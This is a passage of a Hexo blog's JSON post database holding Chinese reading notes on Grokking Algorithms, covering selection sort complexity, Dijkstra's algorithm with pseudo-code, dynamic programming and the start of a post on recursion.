style=\"text-align:center\">O(1)</td>\n<td style=\"text-align:right\">O(n)</td>\n</tr>\n<tr>\n<td>删除</td>\n<td style=\"text-align:center\">O(n)</td>\n<td style=\"text-align:right\">O(1)</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>O（n）是线性时间，O（1）是常量时间</li>\n</ul>\n<h2 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h2><h3 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h3><ul>\n<li>qq 音乐列表里面记录了每个音乐的播放次数，你要对它进行排序，从多到少</li>\n<li>一种办法是遍历这个列表，然后找到播放次数最多的，然后添加到一个新列表</li>\n<li>然后删除刚刚那个次数最多的，再继续这样找到第二多的</li>\n<li>需要检查的就越来越少</li>\n</ul>\n<h3 id=\"算法复杂度（运行时）\"><a href=\"#算法复杂度（运行时）\" class=\"headerlink\" title=\"算法复杂度（运行时）\"></a>算法复杂度（运行时）</h3><ul>\n<li>第一次每个元素都查看一次，那就是执行 n 次</li>\n<li>第二次执行 n-1 次</li>\n<li>依次查看最后得出，要执行 n（n-1）（n-2）..2*1=n*1/2*n</li>\n<li>但是大 O 表示法省略常数，所以最后是 O(n^2)</li>\n</ul>\n"},{"title":"读《图解算法》06-狄克斯特拉算法","date":"2018-05-27T11:45:02.000Z","_content":"\n# 为什么有狄克斯特拉算法\n\n> 这里的时间，换句话，我们给边加上了权重\n\n* 之前 BFS 求出了最短路径，那么如果我们给边加上了时间呢？\n* 发现最短路径并不是最快路径\n\n# 步骤\n\n* 找出最便宜的节点，就是说可以在最短时间内到达的节点（算法关键）\n* 更新该节点的邻居的开销，检查是否有前往他们的更短路径，有就更新\n* 重复这个过程，直到对图中的每个节点都这样做了\n* 计算最终路径\n\n# 术语\n\n* 权重：狄克斯特拉算法用于每条边都有关联数字的图，这些关联数字叫做权重\n* 带权重的图叫做加权图，计算最短路径用狄克斯特拉算法\n* 不带权重的叫非加权图，计算最短路径用广度优先搜索\n* 图还可能有环\n* 负权边：权重是负的。\n* 有负权边的情况，不能使用狄克斯特拉算法。因为该算法这样假设：对于处理过的节点，没有前往该节点的更短路径，只要在没有负权边才成立。应该使用贝尔曼-福德算法。\n\n# 算法实现\n\n* 需要三个散列表\n  * 图的散列表\n  * 节点的开销的散列表\n  * 存储父节点的散列表\n* 需要一个数组，用于记录处理过的节点，不用多次处理\n\n```javascript\n//如何表示加权图\ngraph = {};\ngraph[\"start\"] = {};\ngraph[\"start\"][\"a\"] = 6;\ngraph[\"start\"][\"b\"] = 2;\ngraph[\"a\"] = {};\ngraph[\"a\"][\"fin\"] = 1;\ngraph[\"b\"] = {};\ngraph[\"b\"][\"a\"] = 3;\ngraph[\"b\"][\"fin\"] = 5;\ngraph[\"fin\"] = {}; //终点没有任何邻居\n//开销表\ncosts = {};\ncosts[\"a\"] = 6;\ncosts[\"b\"] = 2;\ncosts[\"fin\"] = infinity;\n\n//父节点表\nparents = {};\nparents[\"a\"] = \"start\";\nparents[\"b\"] = \"start\";\nparents[\"fin\"] = None;\n//算法\nnode = find_lowest_cost_node(costs)  //在未处理的节点中找出开销最小的节点\nwhile node is not None:  //←------这个while循环在所有节点都被处理过后结束\n    cost = costs[node]\n    neighbors = graph[node]\n    for n in neighbors.keys():  //←------遍历当前节点的所有邻居\n        new_cost = cost + neighbors[n]\n        if costs[n] > new_cost:  //←------如果经当前节点前往该邻居更近，\n            costs[n] = new_cost  //←------就更新该邻居的开销\n            parents[n] = node  //←------同时将该邻居的父节点设置为当前节点\n    processed.append(node)  //←------将当前节点标记为处理过\n    node = find_lowest_cost_node(costs)  //←------找出接下来要处理的节点，并循环\n//找出最便宜的节点且没处理过的函数\ndef find_lowest_cost_node(costs):\n    lowest_cost = float(\"inf\")\n    lowest_cost_node = None\n    for node in costs: // ←------遍历所有的节点\n        cost = costs[node]\n        if cost < lowest_cost and node not in processed:  //←------如果当前节点的开销更低且未处理过，\n            lowest_cost = cost // ←------就将其视为开销最低的节点\n            lowest_cost_node = node\n    return lowest_cost_node\n```\n","source":"_posts/study-DijKstra.md","raw":"---\ntitle: 读《图解算法》06-狄克斯特拉算法\ndate: 2018-05-27 19:45:02\ntags: 图解算法\n---\n\n# 为什么有狄克斯特拉算法\n\n> 这里的时间，换句话，我们给边加上了权重\n\n* 之前 BFS 求出了最短路径，那么如果我们给边加上了时间呢？\n* 发现最短路径并不是最快路径\n\n# 步骤\n\n* 找出最便宜的节点，就是说可以在最短时间内到达的节点（算法关键）\n* 更新该节点的邻居的开销，检查是否有前往他们的更短路径，有就更新\n* 重复这个过程，直到对图中的每个节点都这样做了\n* 计算最终路径\n\n# 术语\n\n* 权重：狄克斯特拉算法用于每条边都有关联数字的图，这些关联数字叫做权重\n* 带权重的图叫做加权图，计算最短路径用狄克斯特拉算法\n* 不带权重的叫非加权图，计算最短路径用广度优先搜索\n* 图还可能有环\n* 负权边：权重是负的。\n* 有负权边的情况，不能使用狄克斯特拉算法。因为该算法这样假设：对于处理过的节点，没有前往该节点的更短路径，只要在没有负权边才成立。应该使用贝尔曼-福德算法。\n\n# 算法实现\n\n* 需要三个散列表\n  * 图的散列表\n  * 节点的开销的散列表\n  * 存储父节点的散列表\n* 需要一个数组，用于记录处理过的节点，不用多次处理\n\n```javascript\n//如何表示加权图\ngraph = {};\ngraph[\"start\"] = {};\ngraph[\"start\"][\"a\"] = 6;\ngraph[\"start\"][\"b\"] = 2;\ngraph[\"a\"] = {};\ngraph[\"a\"][\"fin\"] = 1;\ngraph[\"b\"] = {};\ngraph[\"b\"][\"a\"] = 3;\ngraph[\"b\"][\"fin\"] = 5;\ngraph[\"fin\"] = {}; //终点没有任何邻居\n//开销表\ncosts = {};\ncosts[\"a\"] = 6;\ncosts[\"b\"] = 2;\ncosts[\"fin\"] = infinity;\n\n//父节点表\nparents = {};\nparents[\"a\"] = \"start\";\nparents[\"b\"] = \"start\";\nparents[\"fin\"] = None;\n//算法\nnode = find_lowest_cost_node(costs)  //在未处理的节点中找出开销最小的节点\nwhile node is not None:  //←------这个while循环在所有节点都被处理过后结束\n    cost = costs[node]\n    neighbors = graph[node]\n    for n in neighbors.keys():  //←------遍历当前节点的所有邻居\n        new_cost = cost + neighbors[n]\n        if costs[n] > new_cost:  //←------如果经当前节点前往该邻居更近，\n            costs[n] = new_cost  //←------就更新该邻居的开销\n            parents[n] = node  //←------同时将该邻居的父节点设置为当前节点\n    processed.append(node)  //←------将当前节点标记为处理过\n    node = find_lowest_cost_node(costs)  //←------找出接下来要处理的节点，并循环\n//找出最便宜的节点且没处理过的函数\ndef find_lowest_cost_node(costs):\n    lowest_cost = float(\"inf\")\n    lowest_cost_node = None\n    for node in costs: // ←------遍历所有的节点\n        cost = costs[node]\n        if cost < lowest_cost and node not in processed:  //←------如果当前节点的开销更低且未处理过，\n            lowest_cost = cost // ←------就将其视为开销最低的节点\n            lowest_cost_node = node\n    return lowest_cost_node\n```\n","slug":"study-DijKstra","published":1,"updated":"2018-05-28T02:55:21.813Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k800180iofvsteo6qh","content":"<h1 id=\"为什么有狄克斯特拉算法\"><a href=\"#为什么有狄克斯特拉算法\" class=\"headerlink\" title=\"为什么有狄克斯特拉算法\"></a>为什么有狄克斯特拉算法</h1><blockquote>\n<p>这里的时间，换句话，我们给边加上了权重</p>\n</blockquote>\n<ul>\n<li>之前 BFS 求出了最短路径，那么如果我们给边加上了时间呢？</li>\n<li>发现最短路径并不是最快路径</li>\n</ul>\n<h1 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h1><ul>\n<li>找出最便宜的节点，就是说可以在最短时间内到达的节点（算法关键）</li>\n<li>更新该节点的邻居的开销，检查是否有前往他们的更短路径，有就更新</li>\n<li>重复这个过程，直到对图中的每个节点都这样做了</li>\n<li>计算最终路径</li>\n</ul>\n<h1 id=\"术语\"><a href=\"#术语\" class=\"headerlink\" title=\"术语\"></a>术语</h1><ul>\n<li>权重：狄克斯特拉算法用于每条边都有关联数字的图，这些关联数字叫做权重</li>\n<li>带权重的图叫做加权图，计算最短路径用狄克斯特拉算法</li>\n<li>不带权重的叫非加权图，计算最短路径用广度优先搜索</li>\n<li>图还可能有环</li>\n<li>负权边：权重是负的。</li>\n<li>有负权边的情况，不能使用狄克斯特拉算法。因为该算法这样假设：对于处理过的节点，没有前往该节点的更短路径，只要在没有负权边才成立。应该使用贝尔曼-福德算法。</li>\n</ul>\n<h1 id=\"算法实现\"><a href=\"#算法实现\" class=\"headerlink\" title=\"算法实现\"></a>算法实现</h1><ul>\n<li>需要三个散列表<ul>\n<li>图的散列表</li>\n<li>节点的开销的散列表</li>\n<li>存储父节点的散列表</li>\n</ul>\n</li>\n<li>需要一个数组，用于记录处理过的节点，不用多次处理</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//如何表示加权图</span></span><br><span class=\"line\">graph = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"start\"</span>] = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"start\"</span>][<span class=\"string\">\"a\"</span>] = <span class=\"number\">6</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"start\"</span>][<span class=\"string\">\"b\"</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"a\"</span>] = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"a\"</span>][<span class=\"string\">\"fin\"</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"b\"</span>] = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"b\"</span>][<span class=\"string\">\"a\"</span>] = <span class=\"number\">3</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"b\"</span>][<span class=\"string\">\"fin\"</span>] = <span class=\"number\">5</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"fin\"</span>] = &#123;&#125;; <span class=\"comment\">//终点没有任何邻居</span></span><br><span class=\"line\"><span class=\"comment\">//开销表</span></span><br><span class=\"line\">costs = &#123;&#125;;</span><br><span class=\"line\">costs[<span class=\"string\">\"a\"</span>] = <span class=\"number\">6</span>;</span><br><span class=\"line\">costs[<span class=\"string\">\"b\"</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">costs[<span class=\"string\">\"fin\"</span>] = infinity;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//父节点表</span></span><br><span class=\"line\">parents = &#123;&#125;;</span><br><span class=\"line\">parents[<span class=\"string\">\"a\"</span>] = <span class=\"string\">\"start\"</span>;</span><br><span class=\"line\">parents[<span class=\"string\">\"b\"</span>] = <span class=\"string\">\"start\"</span>;</span><br><span class=\"line\">parents[<span class=\"string\">\"fin\"</span>] = None;</span><br><span class=\"line\"><span class=\"comment\">//算法</span></span><br><span class=\"line\">node = find_lowest_cost_node(costs)  <span class=\"comment\">//在未处理的节点中找出开销最小的节点</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> node is not None:  <span class=\"comment\">//←------这个while循环在所有节点都被处理过后结束</span></span><br><span class=\"line\">    cost = costs[node]</span><br><span class=\"line\">    neighbors = graph[node]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> neighbors.keys():  <span class=\"comment\">//←------遍历当前节点的所有邻居</span></span><br><span class=\"line\">        new_cost = cost + neighbors[n]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> costs[n] &gt; new_cost:  <span class=\"comment\">//←------如果经当前节点前往该邻居更近，</span></span><br><span class=\"line\">            costs[n] = new_cost  <span class=\"comment\">//←------就更新该邻居的开销</span></span><br><span class=\"line\">            parents[n] = node  <span class=\"comment\">//←------同时将该邻居的父节点设置为当前节点</span></span><br><span class=\"line\">    processed.append(node)  <span class=\"comment\">//←------将当前节点标记为处理过</span></span><br><span class=\"line\">    node = find_lowest_cost_node(costs)  <span class=\"comment\">//←------找出接下来要处理的节点，并循环</span></span><br><span class=\"line\"><span class=\"comment\">//找出最便宜的节点且没处理过的函数</span></span><br><span class=\"line\">def find_lowest_cost_node(costs):</span><br><span class=\"line\">    lowest_cost = float(<span class=\"string\">\"inf\"</span>)</span><br><span class=\"line\">    lowest_cost_node = None</span><br><span class=\"line\">    <span class=\"keyword\">for</span> node <span class=\"keyword\">in</span> costs: <span class=\"comment\">// ←------遍历所有的节点</span></span><br><span class=\"line\">        cost = costs[node]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cost &lt; lowest_cost and node not <span class=\"keyword\">in</span> processed:  <span class=\"comment\">//←------如果当前节点的开销更低且未处理过，</span></span><br><span class=\"line\">            lowest_cost = cost <span class=\"comment\">// ←------就将其视为开销最低的节点</span></span><br><span class=\"line\">            lowest_cost_node = node</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lowest_cost_node</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"为什么有狄克斯特拉算法\"><a href=\"#为什么有狄克斯特拉算法\" class=\"headerlink\" title=\"为什么有狄克斯特拉算法\"></a>为什么有狄克斯特拉算法</h1><blockquote>\n<p>这里的时间，换句话，我们给边加上了权重</p>\n</blockquote>\n<ul>\n<li>之前 BFS 求出了最短路径，那么如果我们给边加上了时间呢？</li>\n<li>发现最短路径并不是最快路径</li>\n</ul>\n<h1 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h1><ul>\n<li>找出最便宜的节点，就是说可以在最短时间内到达的节点（算法关键）</li>\n<li>更新该节点的邻居的开销，检查是否有前往他们的更短路径，有就更新</li>\n<li>重复这个过程，直到对图中的每个节点都这样做了</li>\n<li>计算最终路径</li>\n</ul>\n<h1 id=\"术语\"><a href=\"#术语\" class=\"headerlink\" title=\"术语\"></a>术语</h1><ul>\n<li>权重：狄克斯特拉算法用于每条边都有关联数字的图，这些关联数字叫做权重</li>\n<li>带权重的图叫做加权图，计算最短路径用狄克斯特拉算法</li>\n<li>不带权重的叫非加权图，计算最短路径用广度优先搜索</li>\n<li>图还可能有环</li>\n<li>负权边：权重是负的。</li>\n<li>有负权边的情况，不能使用狄克斯特拉算法。因为该算法这样假设：对于处理过的节点，没有前往该节点的更短路径，只要在没有负权边才成立。应该使用贝尔曼-福德算法。</li>\n</ul>\n<h1 id=\"算法实现\"><a href=\"#算法实现\" class=\"headerlink\" title=\"算法实现\"></a>算法实现</h1><ul>\n<li>需要三个散列表<ul>\n<li>图的散列表</li>\n<li>节点的开销的散列表</li>\n<li>存储父节点的散列表</li>\n</ul>\n</li>\n<li>需要一个数组，用于记录处理过的节点，不用多次处理</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//如何表示加权图</span></span><br><span class=\"line\">graph = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"start\"</span>] = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"start\"</span>][<span class=\"string\">\"a\"</span>] = <span class=\"number\">6</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"start\"</span>][<span class=\"string\">\"b\"</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"a\"</span>] = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"a\"</span>][<span class=\"string\">\"fin\"</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"b\"</span>] = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"b\"</span>][<span class=\"string\">\"a\"</span>] = <span class=\"number\">3</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"b\"</span>][<span class=\"string\">\"fin\"</span>] = <span class=\"number\">5</span>;</span><br><span class=\"line\">graph[<span class=\"string\">\"fin\"</span>] = &#123;&#125;; <span class=\"comment\">//终点没有任何邻居</span></span><br><span class=\"line\"><span class=\"comment\">//开销表</span></span><br><span class=\"line\">costs = &#123;&#125;;</span><br><span class=\"line\">costs[<span class=\"string\">\"a\"</span>] = <span class=\"number\">6</span>;</span><br><span class=\"line\">costs[<span class=\"string\">\"b\"</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">costs[<span class=\"string\">\"fin\"</span>] = infinity;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//父节点表</span></span><br><span class=\"line\">parents = &#123;&#125;;</span><br><span class=\"line\">parents[<span class=\"string\">\"a\"</span>] = <span class=\"string\">\"start\"</span>;</span><br><span class=\"line\">parents[<span class=\"string\">\"b\"</span>] = <span class=\"string\">\"start\"</span>;</span><br><span class=\"line\">parents[<span class=\"string\">\"fin\"</span>] = None;</span><br><span class=\"line\"><span class=\"comment\">//算法</span></span><br><span class=\"line\">node = find_lowest_cost_node(costs)  <span class=\"comment\">//在未处理的节点中找出开销最小的节点</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> node is not None:  <span class=\"comment\">//←------这个while循环在所有节点都被处理过后结束</span></span><br><span class=\"line\">    cost = costs[node]</span><br><span class=\"line\">    neighbors = graph[node]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> neighbors.keys():  <span class=\"comment\">//←------遍历当前节点的所有邻居</span></span><br><span class=\"line\">        new_cost = cost + neighbors[n]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> costs[n] &gt; new_cost:  <span class=\"comment\">//←------如果经当前节点前往该邻居更近，</span></span><br><span class=\"line\">            costs[n] = new_cost  <span class=\"comment\">//←------就更新该邻居的开销</span></span><br><span class=\"line\">            parents[n] = node  <span class=\"comment\">//←------同时将该邻居的父节点设置为当前节点</span></span><br><span class=\"line\">    processed.append(node)  <span class=\"comment\">//←------将当前节点标记为处理过</span></span><br><span class=\"line\">    node = find_lowest_cost_node(costs)  <span class=\"comment\">//←------找出接下来要处理的节点，并循环</span></span><br><span class=\"line\"><span class=\"comment\">//找出最便宜的节点且没处理过的函数</span></span><br><span class=\"line\">def find_lowest_cost_node(costs):</span><br><span class=\"line\">    lowest_cost = float(<span class=\"string\">\"inf\"</span>)</span><br><span class=\"line\">    lowest_cost_node = None</span><br><span class=\"line\">    <span class=\"keyword\">for</span> node <span class=\"keyword\">in</span> costs: <span class=\"comment\">// ←------遍历所有的节点</span></span><br><span class=\"line\">        cost = costs[node]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cost &lt; lowest_cost and node not <span class=\"keyword\">in</span> processed:  <span class=\"comment\">//←------如果当前节点的开销更低且未处理过，</span></span><br><span class=\"line\">            lowest_cost = cost <span class=\"comment\">// ←------就将其视为开销最低的节点</span></span><br><span class=\"line\">            lowest_cost_node = node</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lowest_cost_node</span><br></pre></td></tr></table></figure>\n"},{"title":"读《图解算法》08-动态规划","date":"2018-06-01T06:50:22.000Z","_content":"\n# 背包问题\n\n* 继续上面贪婪算法的背包问题场景\n\n## 简单算法\n\n* 尝试各种可能的组合，并找出价值最高的组合\n* 3 件商品就会计算 8 个组合，4 件商品就会计算 16 个集合\n* 这就是前面说到的集合覆盖问题，每增加一件商品，需要计算的都要翻倍\n* 这种简单算法的运行时是 O（2 ~n）2 的 n 次方\n* 所以一多，这种算法就行不通，之前就用了近似算法\n\n## 动态规划\n\n* 动态规划就是背包问题的最优解\n* 动态规划的本质是先解决子问题，再逐步解决大问题\n* 每个动态规划都从一个网格开始\n* 每个子问题都是离散的，不相互依赖才可以\n\n### 最长公共子串\n\n* 单元格中的值通常就是你要优化的值。在前面背包问题中，单元格中的值就是你要优化的值。\n* 每个单元格都是子问题\n\n#### 场景\n\n* 用户输错了单词，本来想输 fish，但是输了 hish\n* 假设与 hish 类似的词只有两个（实际上上千个），fish 和 vista，怎么确定是哪一个（哪个单词和它更像）\n* hish 和 fish 都包含的最长公共子串是 ish，用网格来算\n* hish 和 vista 都包含的最长公共子串是 is，用网格来算\n* 因为 fish 的最长公共子串是 3 个，因此用户应该是想输入它\n\n### 最长公共子序列\n\n* 与最长公共子串计算方式不一样\n\n## 动态规划应用\n\n* git diff 比较文件差异\n* 生物学家使用最长公共子序列来确定 dna 的相似性\n","source":"_posts/study-Dynamic-planning.md","raw":"---\ntitle: 读《图解算法》08-动态规划\ndate: 2018-06-01 14:50:22\ntags: 图解算法\n---\n\n# 背包问题\n\n* 继续上面贪婪算法的背包问题场景\n\n## 简单算法\n\n* 尝试各种可能的组合，并找出价值最高的组合\n* 3 件商品就会计算 8 个组合，4 件商品就会计算 16 个集合\n* 这就是前面说到的集合覆盖问题，每增加一件商品，需要计算的都要翻倍\n* 这种简单算法的运行时是 O（2 ~n）2 的 n 次方\n* 所以一多，这种算法就行不通，之前就用了近似算法\n\n## 动态规划\n\n* 动态规划就是背包问题的最优解\n* 动态规划的本质是先解决子问题，再逐步解决大问题\n* 每个动态规划都从一个网格开始\n* 每个子问题都是离散的，不相互依赖才可以\n\n### 最长公共子串\n\n* 单元格中的值通常就是你要优化的值。在前面背包问题中，单元格中的值就是你要优化的值。\n* 每个单元格都是子问题\n\n#### 场景\n\n* 用户输错了单词，本来想输 fish，但是输了 hish\n* 假设与 hish 类似的词只有两个（实际上上千个），fish 和 vista，怎么确定是哪一个（哪个单词和它更像）\n* hish 和 fish 都包含的最长公共子串是 ish，用网格来算\n* hish 和 vista 都包含的最长公共子串是 is，用网格来算\n* 因为 fish 的最长公共子串是 3 个，因此用户应该是想输入它\n\n### 最长公共子序列\n\n* 与最长公共子串计算方式不一样\n\n## 动态规划应用\n\n* git diff 比较文件差异\n* 生物学家使用最长公共子序列来确定 dna 的相似性\n","slug":"study-Dynamic-planning","published":1,"updated":"2018-06-01T14:14:06.861Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k8001a0iofb17xecfx","content":"<h1 id=\"背包问题\"><a href=\"#背包问题\" class=\"headerlink\" title=\"背包问题\"></a>背包问题</h1><ul>\n<li>继续上面贪婪算法的背包问题场景</li>\n</ul>\n<h2 id=\"简单算法\"><a href=\"#简单算法\" class=\"headerlink\" title=\"简单算法\"></a>简单算法</h2><ul>\n<li>尝试各种可能的组合，并找出价值最高的组合</li>\n<li>3 件商品就会计算 8 个组合，4 件商品就会计算 16 个集合</li>\n<li>这就是前面说到的集合覆盖问题，每增加一件商品，需要计算的都要翻倍</li>\n<li>这种简单算法的运行时是 O（2 ~n）2 的 n 次方</li>\n<li>所以一多，这种算法就行不通，之前就用了近似算法</li>\n</ul>\n<h2 id=\"动态规划\"><a href=\"#动态规划\" class=\"headerlink\" title=\"动态规划\"></a>动态规划</h2><ul>\n<li>动态规划就是背包问题的最优解</li>\n<li>动态规划的本质是先解决子问题，再逐步解决大问题</li>\n<li>每个动态规划都从一个网格开始</li>\n<li>每个子问题都是离散的，不相互依赖才可以</li>\n</ul>\n<h3 id=\"最长公共子串\"><a href=\"#最长公共子串\" class=\"headerlink\" title=\"最长公共子串\"></a>最长公共子串</h3><ul>\n<li>单元格中的值通常就是你要优化的值。在前面背包问题中，单元格中的值就是你要优化的值。</li>\n<li>每个单元格都是子问题</li>\n</ul>\n<h4 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h4><ul>\n<li>用户输错了单词，本来想输 fish，但是输了 hish</li>\n<li>假设与 hish 类似的词只有两个（实际上上千个），fish 和 vista，怎么确定是哪一个（哪个单词和它更像）</li>\n<li>hish 和 fish 都包含的最长公共子串是 ish，用网格来算</li>\n<li>hish 和 vista 都包含的最长公共子串是 is，用网格来算</li>\n<li>因为 fish 的最长公共子串是 3 个，因此用户应该是想输入它</li>\n</ul>\n<h3 id=\"最长公共子序列\"><a href=\"#最长公共子序列\" class=\"headerlink\" title=\"最长公共子序列\"></a>最长公共子序列</h3><ul>\n<li>与最长公共子串计算方式不一样</li>\n</ul>\n<h2 id=\"动态规划应用\"><a href=\"#动态规划应用\" class=\"headerlink\" title=\"动态规划应用\"></a>动态规划应用</h2><ul>\n<li>git diff 比较文件差异</li>\n<li>生物学家使用最长公共子序列来确定 dna 的相似性</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"背包问题\"><a href=\"#背包问题\" class=\"headerlink\" title=\"背包问题\"></a>背包问题</h1><ul>\n<li>继续上面贪婪算法的背包问题场景</li>\n</ul>\n<h2 id=\"简单算法\"><a href=\"#简单算法\" class=\"headerlink\" title=\"简单算法\"></a>简单算法</h2><ul>\n<li>尝试各种可能的组合，并找出价值最高的组合</li>\n<li>3 件商品就会计算 8 个组合，4 件商品就会计算 16 个集合</li>\n<li>这就是前面说到的集合覆盖问题，每增加一件商品，需要计算的都要翻倍</li>\n<li>这种简单算法的运行时是 O（2 ~n）2 的 n 次方</li>\n<li>所以一多，这种算法就行不通，之前就用了近似算法</li>\n</ul>\n<h2 id=\"动态规划\"><a href=\"#动态规划\" class=\"headerlink\" title=\"动态规划\"></a>动态规划</h2><ul>\n<li>动态规划就是背包问题的最优解</li>\n<li>动态规划的本质是先解决子问题，再逐步解决大问题</li>\n<li>每个动态规划都从一个网格开始</li>\n<li>每个子问题都是离散的，不相互依赖才可以</li>\n</ul>\n<h3 id=\"最长公共子串\"><a href=\"#最长公共子串\" class=\"headerlink\" title=\"最长公共子串\"></a>最长公共子串</h3><ul>\n<li>单元格中的值通常就是你要优化的值。在前面背包问题中，单元格中的值就是你要优化的值。</li>\n<li>每个单元格都是子问题</li>\n</ul>\n<h4 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h4><ul>\n<li>用户输错了单词，本来想输 fish，但是输了 hish</li>\n<li>假设与 hish 类似的词只有两个（实际上上千个），fish 和 vista，怎么确定是哪一个（哪个单词和它更像）</li>\n<li>hish 和 fish 都包含的最长公共子串是 ish，用网格来算</li>\n<li>hish 和 vista 都包含的最长公共子串是 is，用网格来算</li>\n<li>因为 fish 的最长公共子串是 3 个，因此用户应该是想输入它</li>\n</ul>\n<h3 id=\"最长公共子序列\"><a href=\"#最长公共子序列\" class=\"headerlink\" title=\"最长公共子序列\"></a>最长公共子序列</h3><ul>\n<li>与最长公共子串计算方式不一样</li>\n</ul>\n<h2 id=\"动态规划应用\"><a href=\"#动态规划应用\" class=\"headerlink\" title=\"动态规划应用\"></a>动态规划应用</h2><ul>\n<li>git diff 比较文件差异</li>\n<li>生物学家使用最长公共子序列来确定 dna 的相似性</li>\n</ul>\n"},{"title":"读《图解算法》03-递归和栈","date":"2018-05-06T11:07:56.000Z","_content":"\n## 递归\n\n### 概念\n\n* 函数调用自己\n* 需要有基线条件和递归条件\n\n### 基线条件和递归条件\n\n> 每个递归函数都有两部分：基线条件和递归条件。\n\n* 递归条件是指函数调用自己\n* 基线条件是指函数不再调用自己，从而避免无限循环\n\n```javascript\n//倒计时\nfunction countdown(i) {\n  console.log(i);\n  if (i <= 0) {\n    return; //基线条件\n  } else {\n    countdown(i - 1);\n    //递归条件;\n  }\n}\n```\n\n## 栈\n\n### 概念\n\n* 一种类似堆叠的盘子的数据结构\n\n### 